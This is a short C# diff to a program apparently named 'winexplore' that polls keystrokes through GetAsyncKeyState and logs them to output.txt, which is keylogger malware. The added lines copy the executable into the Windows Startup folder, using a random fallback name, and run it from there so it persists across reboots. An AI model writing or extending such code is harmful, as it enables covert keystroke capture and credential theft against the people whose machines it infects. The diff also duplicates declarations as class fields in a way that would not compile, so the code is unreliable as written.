@@ -11,12 +11,35 @@ namespace winexplore
 {
     class Program
     {
+        Random rnd = new Random();
+        int ting = rnd.Next(97, 122);
+        string startupDir = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
+        string altName = @"\pl" + Convert.ToString((char)ting) + ".exe";
 
-        
         [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i);
 
         static void Main(string[] args)
         {
+            Random rnd = new Random();
+            int ting = rnd.Next(97, 122);
+            string startupDir = @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup";
+            string altName = @"\pl" + Convert.ToString((char)ting) + ".exe";
+            if (Directory.GetCurrentDirectory() != startupDir)
+            {
+                try
+                {
+                    File.Copy("pl.exe", (startupDir + @"\pl.exe"));
+                    runCommand(startupDir + @"\pl.exe");
+                    return;
+                }
+                catch
+                {
+                    File.Copy("pl.exe", (startupDir + altName));
+                    runCommand(startupDir + altName);
+                    return;
+                }
+            }
+
             string PATH = @"output.txt";
             int READSIZE = 100; // Number of characters to read after being activated, to prevent collateral damage
             int currentRead = 0;
